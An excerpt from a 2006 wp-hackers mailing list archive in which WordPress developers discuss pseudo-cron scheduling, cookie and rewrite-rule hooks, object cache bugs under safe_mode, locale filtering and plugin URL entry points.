> dstewart@atl.lmco.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



--
-------------------------------------------------------
J. Scott Johnson
Ookles launches 2/28/06 - have you signed up yet?
new startup: http://ookles.com/
blog: http://fuzzyblog.com/
podcast: http://techwarstories.com/
fuzzygroup@gmail.com
aim: fuzzygroup
cell: 857 222 6459
-------------------------------------------------------
From sam at rephrase.net  Fri Feb  3 00:24:48 2006
From: sam at rephrase.net (Sam Angove)
Date: Fri Feb  3 00:26:13 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E29E05.1050601@atl.lmco.com>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
	<43E261BB.8000406@gunters.org>
	<43E28C52.90307@cygnusinteractive.com>
	<43E29E05.1050601@atl.lmco.com>
Message-ID: <aa74b1910602021624x50bd38dev97ec49065fb4bcb8@mail.gmail.com>

On 2/3/06, Doug Stewart <dstewart@atl.lmco.com> wrote:
>
> Yes, they do.  It's called "cron.php" and you (wait for it) set up a
> cron job to run it at regular intervals.

There's also a module called Poor Man's Cron.[1]

IMO the Drupal way would be perfect: let people use real cron if
they're able, pseudo-cron if not.

[1]: http://drupal.org/project/poormanscron
From wphackers at jamietalbot.com  Fri Feb  3 00:58:20 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Fri Feb  3 00:59:55 2006
Subject: [wp-hackers] Setting A Cookie
In-Reply-To: <ebe43d680602021039y64234e4el@mail.gmail.com>
References: <43E247B5.8040407@jamietalbot.com>	<e6ec604d0602021026y467b25b6seec0e466461c7ddb@mail.gmail.com>
	<ebe43d680602021039y64234e4el@mail.gmail.com>
Message-ID: <43E2AAAC.4090807@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

David House wrote:
> On 02/02/06, Andy Skelton <skeltoac@gmail.com> wrote:
> 
>>You can't? I thought headers weren't actually sent until there was
>>output, which doesn't usually occur until after template_redirect. I'd
>>hook to that.

Thanks didn't know that.  I assumed they were sent in send_headers without checking.  (The name was
a distraction!)

> I'd still go for parse_query. It's the earliest time after all the
> query vars have been picked up and parsed. Personal preference I
> guess.

Had forgotten about the parse_query action.  Thanks, I'll give it a try.

Thanks both of you for your help!

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Thunderbird - http://enigmail.mozdev.org

iD8DBQFD4qqrrovxfShShFARAv/GAKCCnR9Yj+uvBGzbeTyTnWaTbf43lwCcDD6I
KNuORegx900Oz8OvRn/H8Xs=
=q6WV
-----END PGP SIGNATURE-----
From wphackers at jamietalbot.com  Fri Feb  3 01:20:05 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Fri Feb  3 01:21:36 2006
Subject: [wp-hackers] Update Plugin Rewrite Rules
In-Reply-To: <b3522afe0602021439k3693a815x@mail.gmail.com>
References: <b3522afe0601140842q6dcfdcddm@mail.gmail.com>	<ebe43d680601140942q53b6ebc0h@mail.gmail.com>	<b3522afe0601150902k7bf8ce2bx@mail.gmail.com>	<b3522afe0602020840x4cbbe43fo@mail.gmail.com>	<43E2463D.5010703@jamietalbot.com>
	<b3522afe0602021439k3693a815x@mail.gmail.com>
Message-ID: <43E2AFC5.2030000@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Mr.Brown wrote:
> I try to semplify the question: it is possible in 2.0.1 to pass a
> variable to a Page in this way
> mysite.com/page-slug/var/ ???
> It is possible using rewrite rules? And in which way it is possible?

Yes, it is possible:

I can't explain it much more but you can see a demonstration here:

http://dev.wp-plugins.org/file/gengo/trunk/gengo/gengo.php

Look at the constructor which adds the filters, and the functions rewrite_rules() and query_vars();

Basically, I do exactly the same as that demo code, which works for me.  I'm not sure why it's not
working for you, sorry.

Good luck,

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Thunderbird - http://enigmail.mozdev.org

iD8DBQFD4q/ErovxfShShFARAh3dAJ41h/5oFZG9SIudEUOiw08rBcoaEwCeOM7C
C11rpzuzjWMYbrVMG6NrZs4=
=1O9E
-----END PGP SIGNATURE-----
From wphackers at jamietalbot.com  Fri Feb  3 01:29:05 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Fri Feb  3 01:30:33 2006
Subject: [wp-hackers] Help for Plugin Noob
In-Reply-To: <F43FD915-8179-4597-999C-2A2D2F6C3BAD@yournextbroker.com>
References: <D70E2560-9CB1-4A70-87E9-33F23F28D6E9@yournextbroker.com>	<43DB3C6A.4050307@jamietalbot.com>
	<F43FD915-8179-4597-999C-2A2D2F6C3BAD@yournextbroker.com>
Message-ID: <43E2B1E1.2080808@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Eric Hochberger wrote
> Jamie,
> 
> Wow so that did reveal one problem -- there's already a /directory/?$ 
> rewrite.  I've changed mine to /resources/
> 
> However, I tried dumping the entire rules array and I don't even see  my
> new rule I added.  Any idea why it would not be adding my rule?
> 
> Thanks,
> Eric

Did you dump the array after your rules were added?  Silly question, but worth checking.  You might
try passing by reference instead of using array_merge().  Not sure if that will help though, sorry.
 You don't want to a new query variable, do you?  Just a simple redirect if the base is /directory ?

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Thunderbird - http://enigmail.mozdev.org

iD8DBQFD4rHhrovxfShShFARAoEkAJ0cCRchhCYM+CXFAvJ9YOb2+r+xpgCfRKVV
p1IAXNoqT+aRjfiQBl5IVFo=
=+pg1
-----END PGP SIGNATURE-----
From mrbrog at gmail.com  Fri Feb  3 02:32:37 2006
From: mrbrog at gmail.com (Mr.Brown)
Date: Fri Feb  3 02:40:09 2006
Subject: [wp-hackers] Update Plugin Rewrite Rules
In-Reply-To: <43E2AFC5.2030000@jamietalbot.com>
References: <b3522afe0601140842q6dcfdcddm@mail.gmail.com>
	<ebe43d680601140942q53b6ebc0h@mail.gmail.com>
	<b3522afe0601150902k7bf8ce2bx@mail.gmail.com>
	<b3522afe0602020840x4cbbe43fo@mail.gmail.com>
	<43E2463D.5010703@jamietalbot.com>
	<b3522afe0602021439k3693a815x@mail.gmail.com>
	<43E2AFC5.2030000@jamietalbot.com>
Message-ID: <b3522afe0602021832q1cc19f9ck@mail.gmail.com>

Jamie Talbot wrote

[cut]

> I can't explain it much more but you can see a demonstration here:
> http://dev.wp-plugins.org/file/gengo/trunk/gengo/gengo.php

[cut]

Thanks Jamie, I tried also with your plugin examples but didn't work.
But I found this example here
www.fabriziotarizzo.org/cache/query_redirect_rewrite.phps
and now works :-)

Thanks again
:-)
--
Mr.Brown
From mark.wordpress at txfx.net  Fri Feb  3 05:26:16 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Fri Feb  3 05:27:37 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
Message-ID: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>

I just had a rather strange experience with the object cache.  I just  
moved my site to a new server, and I deleted the contents of the /wp- 
content/cache/ directory before moving.  At the new host, I was  
getting 80+ queries on my front page (redundant option hits).  I  
chown/chmod'd my /cache/ directory into oblivion... I was confident  
that I had it set correctly... but nothing.  Then, out of  
desperation, I started moving files from another WP install's cache  
into my cache.  Once I moved wp_object_cache.lock into my /cache/  
directory, it started working.

I took out all the error suppressing @s from /wp-includes/cache.php  
in an effort to try to get it to throw an fopen() error, but it  
didn't make a peep.  If /cache/ wasn't there, it wouldn't be created,  
even though the permissions were set up so that it could.

Why can't WordPress create this file?  Why wasn't WordPress reverting  
to the old caching method (i.e. select all options where autoload =  
'1' and store them in memory for that load)?

Debian 3.1
PHP4 as Apache2 module
Safe Mode OFF
--
Mark Jaquith
http://txfx.net/


From jason at zenenet.com  Fri Feb  3 06:19:23 2006
From: jason at zenenet.com (Jason S.)
Date: Fri Feb  3 06:20:44 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E17050.1010708@midnightcircus.com>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
Message-ID: <43E2F5EB.6070809@zenenet.com>

Owen Winkler wrote:
> * OpenID.

HERO!
Yes, seriously.  I would also go as far as to say WP should use YADIS to
declare that we support OpenID and not any of the other technologies (yet?).
There's a few new technologies (SXIP, IIRC, was one of the big names)
jumping on the YADIS bandwagon.

Again, this isn't something that needs to be in core (though it'd be
nice! :D)... but an official, well-working Global Login System built on
OpenID would rock.

P.S. Supporting OpenID comments instantly gives you a participant base
of every up to date journal site (LiveJournal, of course, being the
people in the lead as far as developing the software, DeadJournal, and
probably GreatestJournl and a few others).
P.P.S. wp.com ;-D
From fuzzygroup at gmail.com  Fri Feb  3 06:43:10 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Fri Feb  3 06:44:31 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E2F5EB.6070809@zenenet.com>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
	<43E2F5EB.6070809@zenenet.com>
Message-ID: <8e1656660602022243i4b549ffane625e469c33717bc@mail.gmail.com>

Don't forget there's also the approach Drupal used which was a cross Drupal
site login system (plus authenticating against IM systems).  This to me was
always the spiffiest part of Drupal.  But, honestly, I love anything  Brad
Fitz does (he's behind OpenID).

But, serious, login, which is something us real geeks take for granted is a
huge end user problem that we tend to ignore and addressing it even slightly
would be outstanding.  I know at my last gig (and at other points in my
career) login issues were always the biggest or 2nd biggest point of
frustration.

S

On 2/3/06, Jason S. <jason@zenenet.com> wrote:
>
> Owen Winkler wrote:
> > * OpenID.
>
> HERO!
> Yes, seriously.  I would also go as far as to say WP should use YADIS to
> declare that we support OpenID and not any of the other technologies
> (yet?).
> There's a few new technologies (SXIP, IIRC, was one of the big names)
> jumping on the YADIS bandwagon.
>
> Again, this isn't something that needs to be in core (though it'd be
> nice! :D)... but an official, well-working Global Login System built on
> OpenID would rock.
>
> P.S. Supporting OpenID comments instantly gives you a participant base
> of every up to date journal site (LiveJournal, of course, being the
> people in the lead as far as developing the software, DeadJournal, and
> probably GreatestJournl and a few others).
> P.P.S. wp.com ;-D
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From ryan at boren.nu  Fri Feb  3 07:09:43 2006
From: ryan at boren.nu (Ryan Boren)
Date: Fri Feb  3 07:11:09 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
In-Reply-To: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
Message-ID: <43E301B7.1000408@boren.nu>

Mark Jaquith wrote:
> I just had a rather strange experience with the object cache.  I just  
> moved my site to a new server, and I deleted the contents of the /wp- 
> content/cache/ directory before moving.  At the new host, I was  getting 
> 80+ queries on my front page (redundant option hits).  I  chown/chmod'd 
> my /cache/ directory into oblivion... I was confident  that I had it set 
> correctly... but nothing.  Then, out of  desperation, I started moving 
> files from another WP install's cache  into my cache.  Once I moved 
> wp_object_cache.lock into my /cache/  directory, it started working.
> 
> I took out all the error suppressing @s from /wp-includes/cache.php  in 
> an effort to try to get it to throw an fopen() error, but it  didn't 
> make a peep.  If /cache/ wasn't there, it wouldn't be created,  even 
> though the permissions were set up so that it could.
> 
> Why can't WordPress create this file?  Why wasn't WordPress reverting  
> to the old caching method (i.e. select all options where autoload =  '1' 
> and store them in memory for that load)?


We were seeing this with safe_mode enabled, which is why the cache is 
now disabled if safe_mode is on.  What happens in the safe_mode case is 
that WP thinks it can write because is_writable() returns true.  The 
cache isn't really writable, however, and later attempts to write to the 
cache fail.  We don't revert to the old method because is_writable() is 
telling us that we are able to write to the cache even though that isn't 
the case.

Ryan

From wphackers at jamietalbot.com  Fri Feb  3 08:43:37 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Fri Feb  3 08:45:14 2006
Subject: [wp-hackers] Locale woes
Message-ID: <43E317B9.2020902@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hi,

I'm having difficulty trying to dynamically set the $locale from within a localised plugin.  I have
a filter, 'locale' which should replace the current locale with a plugin specified one and is
registered in the constructor.

function locale($locale)
{
	return $this->my_locale;
}

I've also localised the plugin and call load_plugin_textdomain() in the constructor.

The problem:

Calling load_plugin_textdomain() before add_filter('locale', array(&$this, 'locale')) causes
get_locale() to be executed before my filter is registered, which means that the locale remains as
it is.  This would not necessarily be a problem as get_locale() is executed again for
load_default_textdomain() except that in get_locale(), if the $locale is already set, it is simply
returned, rather than being refiltered (wp-l10n.php line 12).

If I call add_filter before load_plugin_textdomain() I get this error:

Fatal error: Cannot instantiate non-existent class: cachedfilereader in
/path/to/wp/wp-includes/wp-l10n.php on line 67

That's this line:

$input = new CachedFileReader($mofile);

where $mofile is the locale that my filter returns.

This error only occurs if $this->my_locale matches an existant .mo file, which is not defined as
WPLANG.  Setting it to 'de_DE', for example, if that language pack is not installed, causes no
error.  Of course, because no 'de_DE' language pack is installed, it's pretty pointless.  If I have
the language pack 'ja_JP' and my filter returns 'ja_JP', if WPLANG is defined as 'ja_JP' then all is
well.  If WPLANG is defined as something else, I get that error.

Can anybody shed some light on what is happening here?  I've looked around and seen this problem
discussed before, but the best solution was just to delete all the .mo files, which isn't
particularly useful in my case...


Thanks,

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Thunderbird - http://enigmail.mozdev.org

iD8DBQFD4xe5rovxfShShFARAlQGAJwPvQBJ2zLlFoQyp8ytdwoaK845WwCfaKA3
+rx6ENxGyblg+vPHh5nZev0=
=gzY5
-----END PGP SIGNATURE-----
From wphackers at jamietalbot.com  Fri Feb  3 09:06:20 2006
From: wphackers at jamietalbot.com (Jamie Talbot)
Date: Fri Feb  3 09:07:49 2006
Subject: [wp-hackers] Locale woes
In-Reply-To: <43E317B9.2020902@jamietalbot.com>
References: <43E317B9.2020902@jamietalbot.com>
Message-ID: <43E31D0C.60703@jamietalbot.com>

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Jamie Talbot wrote:
> Fatal error: Cannot instantiate non-existent class: cachedfilereader in
> /path/to/wp/wp-includes/wp-l10n.php on line 67
> 
> That's this line:
> 
> $input = new CachedFileReader($mofile);
> 
> where $mofile is the locale that my filter returns.
> 
> This error only occurs if $this->my_locale matches an existant .mo file, which is not defined as
> WPLANG.  Setting it to 'de_DE', for example, if that language pack is not installed, causes no
> error.  Of course, because no 'de_DE' language pack is installed, it's pretty pointless.  If I have
> the language pack 'ja_JP' and my filter returns 'ja_JP', if WPLANG is defined as 'ja_JP' then all is
> well.  If WPLANG is defined as something else, I get that error.
> 

The solution after all is pretty simple, I think.  streams.php is not being included if WPLANG is
set to '', so as long as it is set to something in wp-config.php, there isn't a problem.

I know you were worried, but you can all relax now :)

Jamie.

- --
http://jamietalbot.com
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.2.5 (MingW32)
Comment: Using GnuPG with Thunderbird - http://enigmail.mozdev.org

iD8DBQFD4x0LrovxfShShFARAh13AJ9kpwQDwr//e2gyLXQR6ZqYOnvcOwCgh0FR
qCzDzwSSOdS8AkrxfklobUw=
=B+EZ
-----END PGP SIGNATURE-----
From michelv at gmail.com  Fri Feb  3 09:14:17 2006
From: michelv at gmail.com (Michel Valdrighi)
Date: Fri Feb  3 09:15:42 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
In-Reply-To: <43E301B7.1000408@boren.nu>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
	<43E301B7.1000408@boren.nu>
Message-ID: <125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>

> > Why wasn't WordPress reverting
> > to the old caching method (i.e. select all options where autoload =  '1'
> > and store them in memory for that load)?

> We don't revert to the old method because is_writable() is
> telling us that we are able to write to the cache even though that isn't
> the case.

I haven't had time to dive into the code yet (doh), but what if there
were a check done in addition to is_writable(), to see if the first
time we try to cache something it really works? If the result of the
test is negative, revert to memory store.

--
Michel Valdrighi
Dev?loppeur Web Intraordinaire
http://zengun.org/weblog/
From mark.wordpress at txfx.net  Fri Feb  3 10:29:40 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Fri Feb  3 10:31:02 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
In-Reply-To: <125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
	<43E301B7.1000408@boren.nu>
	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>
Message-ID: <800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>

On Feb 3, 2006, at 4:14 AM, Michel Valdrighi wrote:

> what if there
> were a check done in addition to is_writable(), to see if the first
> time we try to cache something it really works? If the result of the
> test is negative, revert to memory store.

Sounds good to me.  Only thing is that we'll have to create an option  
for it... and that'll add a query to every page (as it will be run  
before you grab the options from the object cache or do the autoload  
options query).  And the option will probably have to have an  
interface to change it, in case someone fixes the situation with  
safe_mode.

I still would like to know what was up with my situation (no  
safe_mode, wp-content was writable)... oh well.
--
Mark Jaquith
http://txfx.net/


From dmhouse at gmail.com  Fri Feb  3 10:57:57 2006
From: dmhouse at gmail.com (David House)
Date: Fri Feb  3 10:59:18 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <8e1656660602021615m681e970cv7f54a200a90541c2@mail.gmail.com>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
	<43E261BB.8000406@gunters.org>
	<43E28C52.90307@cygnusinteractive.com>
	<43E29E05.1050601@atl.lmco.com>
	<8e1656660602021615m681e970cv7f54a200a90541c2@mail.gmail.com>
Message-ID: <ebe43d680602030257h7427da9er@mail.gmail.com>

On 03/02/06, Scott johnson <fuzzygroup@gmail.com> wrote:
> I do think that this type of "psuedo cron" approach would work well and be
> very generically useful.

That's how WP-Cron works. To be honest, I don't see any reason why we
can't just merge that plugin into the core.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From dmhouse at gmail.com  Fri Feb  3 11:02:21 2006
From: dmhouse at gmail.com (David House)
Date: Fri Feb  3 11:03:40 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
In-Reply-To: <800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
	<43E301B7.1000408@boren.nu>
	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>
	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>
Message-ID: <ebe43d680602030302vdbbc3c1n@mail.gmail.com>

On 03/02/06, Mark Jaquith <mark.wordpress@txfx.net> wrote:
> Sounds good to me.  Only thing is that we'll have to create an option
> for it... and that'll add a query to every page (as it will be run
> before you grab the options from the object cache or do the autoload
> options query).  And the option will probably have to have an
> interface to change it, in case someone fixes the situation with
> safe_mode.

We don't need an option. At the moment we have a constant,
ENABLE_CACHE, which you can define in wp-config.php to enable the
cache even when safe mode is on.

--
-David House, dmhouse@gmail.com, http://xmouse.ithium.net
From mark.wordpress at txfx.net  Fri Feb  3 12:00:24 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Fri Feb  3 12:01:53 2006
Subject: [wp-hackers] Bizarre /cache/ experience with wp_object_cache.lock
In-Reply-To: <ebe43d680602030302vdbbc3c1n@mail.gmail.com>
References: <B4CEFF13-61AE-4A45-85E7-B0E04D150D6E@txfx.net>
	<43E301B7.1000408@boren.nu>
	<125fee7f0602030114w20a256cn285dc2e1b0200e8@mail.gmail.com>
	<800F536A-378C-41D3-97B3-02675C1F1D6F@txfx.net>
	<ebe43d680602030302vdbbc3c1n@mail.gmail.com>
Message-ID: <76CA82D7-66C7-4DBF-B12A-179D01A9391A@txfx.net>

On Feb 3, 2006, at 6:02 AM, David House wrote:

> At the moment we have a constant,
> ENABLE_CACHE, which you can define in wp-config.php to enable the
> cache even when safe mode is on.

We'll still need an option if we want to automatically disable the  
cache when it isn't working an avoid those 300+ query loads.  The  
average user (a) isn't going to know that 300 queries are being made)  
and (b) probably won't figure out very quickly how to do define 
('DISABLE_CACHE', true); to revert to the old cache method.

--
Mark Jaquith
http://txfx.net/


From fuzzygroup at gmail.com  Fri Feb  3 12:04:26 2006
From: fuzzygroup at gmail.com (Scott johnson)
Date: Fri Feb  3 12:05:48 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <ebe43d680602030257h7427da9er@mail.gmail.com>
References: <43E15349.6060708@boren.nu> <43E17050.1010708@midnightcircus.com>
	<43E261BB.8000406@gunters.org>
	<43E28C52.90307@cygnusinteractive.com>
	<43E29E05.1050601@atl.lmco.com>
	<8e1656660602021615m681e970cv7f54a200a90541c2@mail.gmail.com>
	<ebe43d680602030257h7427da9er@mail.gmail.com>
Message-ID: <8e1656660602030404g6acd7238xb1bcb9a8bbaae028@mail.gmail.com>

*blink*.  *bows towards a master; feels small and humble; races to install
it*.  +1 on that then.

S

On 2/3/06, David House <dmhouse@gmail.com> wrote:
>
> On 03/02/06, Scott johnson <fuzzygroup@gmail.com> wrote:
> > I do think that this type of "psuedo cron" approach would work well and
> be
> > very generically useful.
>
> That's how WP-Cron works. To be honest, I don't see any reason why we
> can't just merge that plugin into the core.
>
> --
> -David House, dmhouse@gmail.com, http://xmouse.ithium.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From mark.wordpress at txfx.net  Fri Feb  3 12:08:30 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Fri Feb  3 12:09:51 2006
Subject: [wp-hackers] APC Object Cache Backend
Message-ID: <1EDA27F8-BAEB-4D93-A5BC-CAE231F633DE@txfx.net>

I was curious as to how easy it would be to create an object cache  
backend that interfaced with APC (Advanced PHP Cache).  Real easy, it  
turns out, thanks to Ryan's Memcached backend.  It was literally just  
an issue of changing half a dozen function names and saving the thing.

I'm not seeing much of a speed gain, but then Ryan said that for  
single blogs the Memcached backend didn't do much either.

Anyway, I'm attaching it for anyone who is interested.  Rename it  
"object-cache.php" and place in /wp-content/

It's set up to fail gracefully (fall back to default cache) if APC  
functions aren't available.

Oh, Ryan... you may want to look at the key generating method in the  
Memcached one... I had to modify it to prepend something specific to  
the blog (I used ABSPATH) because I was getting leaking between blogs  
on the same server, otherwise.
--
Mark Jaquith
http://txfx.net/

-------------- next part --------------

From mark.wordpress at txfx.net  Fri Feb  3 12:12:06 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Fri Feb  3 12:13:27 2006
Subject: [wp-hackers] APC Object Cache Backend
In-Reply-To: <1EDA27F8-BAEB-4D93-A5BC-CAE231F633DE@txfx.net>
References: <1EDA27F8-BAEB-4D93-A5BC-CAE231F633DE@txfx.net>
Message-ID: <81BCF910-E65D-4C8B-91E1-480D1B4588FB@txfx.net>

On Feb 3, 2006, at 7:08 AM, Mark Jaquith wrote:

> Anyway, I'm attaching it for anyone who is interested.

At least I thought I was... let's try that again.
-------------- next part --------------

--
Mark Jaquith
http://txfx.net/


From mark.wordpress at txfx.net  Fri Feb  3 12:16:24 2006
From: mark.wordpress at txfx.net (Mark Jaquith)
Date: Fri Feb  3 12:17:49 2006
Subject: [wp-hackers] APC Object Cache Backend
In-Reply-To: <81BCF910-E65D-4C8B-91E1-480D1B4588FB@txfx.net>
References: <1EDA27F8-BAEB-4D93-A5BC-CAE231F633DE@txfx.net>
	<81BCF910-E65D-4C8B-91E1-480D1B4588FB@txfx.net>
Message-ID: <F35A8B91-9A6C-49A9-983D-D0054AE5201C@txfx.net>

On Feb 3, 2006, at 7:12 AM, Mark Jaquith wrote:

>> Anyway, I'm attaching it for anyone who is interested.
>
> At least I thought I was... let's try that again.

Okay then... stripping out attachments.  We can do it this way:

http://txfx.net/files/wordpress/apc-object-cache.phps

--
Mark Jaquith
http://txfx.net/


From ringmaster at midnightcircus.com  Fri Feb  3 13:50:22 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Feb  3 13:50:43 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <ebe43d680602030257h7427da9er@mail.gmail.com>
References: <43E15349.6060708@boren.nu>
	<43E17050.1010708@midnightcircus.com>	<43E261BB.8000406@gunters.org>	<43E28C52.90307@cygnusinteractive.com>	<43E29E05.1050601@atl.lmco.com>	<8e1656660602021615m681e970cv7f54a200a90541c2@mail.gmail.com>
	<ebe43d680602030257h7427da9er@mail.gmail.com>
Message-ID: <43E35F9E.3070001@midnightcircus.com>

David House wrote:
> On 03/02/06, Scott johnson <fuzzygroup@gmail.com> wrote:
>> I do think that this type of "psuedo cron" approach would work well and be
>> very generically useful.
> 
> That's how WP-Cron works. To be honest, I don't see any reason why we
> can't just merge that plugin into the core.

One thing I've advocated is that there be a direct URL in WP-Cron for 
wget'ing it from a real cron.  This would allow for reliable execution 
that doesn't potentially delay any site output.  It would still work the 
same way, executing hooks based on preset intervals, but it could be 
made to do it more regularly.

Owen




From skippy at skippy.net  Fri Feb  3 13:52:29 2006
From: skippy at skippy.net (Scott Merrill)
Date: Fri Feb  3 13:53:32 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E35F9E.3070001@midnightcircus.com>
References: <43E15349.6060708@boren.nu>	<43E17050.1010708@midnightcircus.com>	<43E261BB.8000406@gunters.org>	<43E28C52.90307@cygnusinteractive.com>	<43E29E05.1050601@atl.lmco.com>	<8e1656660602021615m681e970cv7f54a200a90541c2@mail.gmail.com>	<ebe43d680602030257h7427da9er@mail.gmail.com>
	<43E35F9E.3070001@midnightcircus.com>
Message-ID: <43E3601D.80602@skippy.net>

Owen Winkler wrote:
> One thing I've advocated is that there be a direct URL in WP-Cron for
> wget'ing it from a real cron.  This would allow for reliable execution
> that doesn't potentially delay any site output.  It would still work the
> same way, executing hooks based on preset intervals, but it could be
> made to do it more regularly.

I asked in #wordpress for details about this awhile back, but I forget
if you answered.  Do you want a single "?cron=go" trigger, which merely
executes whatever hook is next scheduled to fire; or do you want more
granularity ( "?cron=60" or "?cron=15" ) in order to specifically call
just the hooks you want?

-- 
skippy@skippy.net | http://skippy.net/

gpg --keyserver pgp.mit.edu --recv-keys 9CFA4B35
506C F8BB 17AE 8A05 0B49  3544 476A 7DEC 9CFA 4B35
From ringmaster at midnightcircus.com  Fri Feb  3 14:17:48 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Feb  3 14:18:16 2006
Subject: [wp-hackers] Development for 2.next
In-Reply-To: <43E3601D.80602@skippy.net>
References: <43E15349.6060708@boren.nu>	<43E17050.1010708@midnightcircus.com>	<43E261BB.8000406@gunters.org>	<43E28C52.90307@cygnusinteractive.com>	<43E29E05.1050601@atl.lmco.com>	<8e1656660602021615m681e970cv7f54a200a90541c2@mail.gmail.com>	<ebe43d680602030257h7427da9er@mail.gmail.com>	<43E35F9E.3070001@midnightcircus.com>
	<43E3601D.80602@skippy.net>
Message-ID: <43E3660C.2030604@midnightcircus.com>

Scott Merrill wrote:
> Owen Winkler wrote:
>> One thing I've advocated is that there be a direct URL in WP-Cron for
>> wget'ing it from a real cron.  This would allow for reliable execution
>> that doesn't potentially delay any site output.  It would still work the
>> same way, executing hooks based on preset intervals, but it could be
>> made to do it more regularly.
> 
> I asked in #wordpress for details about this awhile back, but I forget
> if you answered.  Do you want a single "?cron=go" trigger, which merely
> executes whatever hook is next scheduled to fire; or do you want more
> granularity ( "?cron=60" or "?cron=15" ) in order to specifically call
> just the hooks you want?
> 

I think that a "?cron=go" is probably sufficient, as long as the cron is 
executed as frequently as wp-cron needs.

My suggestion would also be to store the last time wp-cron was executed 
via "?cron=go" in options.  Pseudo-cron would not be triggered if the 
option had a time stored for the last "?cron=go" request that was more 
recent than the required minimum duration between cron executions (15 
minutes?).  That way you can avoid a user option for turning off 
pseudo-cron AND have more reliable execution for when cron isn't working 
or is improperly configured, since pseudo-cron would execute if a 
scheduled cron was somehow skipped.

Owen


From ringmaster at midnightcircus.com  Fri Feb  3 14:34:59 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Feb  3 14:35:27 2006
Subject: [wp-hackers] Friendly plugin URL entrypoints?
Message-ID: <43E36A13.90102@midnightcircus.com>

Would it be worthwhile to have a dedicated friendly-style URL entry 
point for plugins?  For example...

I have a couple plugins that employ Ajax.  I have a couple that generate 
javascript based on a request.  It would be useful to have a URL that 
was an entry point to those features that didn't include three 
directories of depth of wp organization.

Instead of requesting:
http://example.com/wp-content/plugins/myplugin/myplugin.php?entrypoint=1

I could request something like:
http://example.com/_plugin/myplugin/1

And I could generate that URL by calling something like:
get_plugin_entrypoint('myplugin', 1);

And just maybe a request of that URL could fire a hook:
do_action('entrypoint_myplugin', 1);

Which I would register by calling:
register_entrypoint('myplugin', 1, 'my_entrypoint_function');

Yes, I can modify the rewrite rules in my plugin to handle this.  But 
I'll do it in every plugin I write that uses javascript like this, which 
would repeat a bunch of code.  If some other developer does it, we'll be 
cluttering the site's URL landscape with plugin entrypoints, and it 
might be nice to put them all in one place.  Something like this could 
make it much easier to implement Ajax (and other javascript techniques) 
via plugin to provide a more rich user experience.

Does this seem worthwhile?  Does it seem doable?

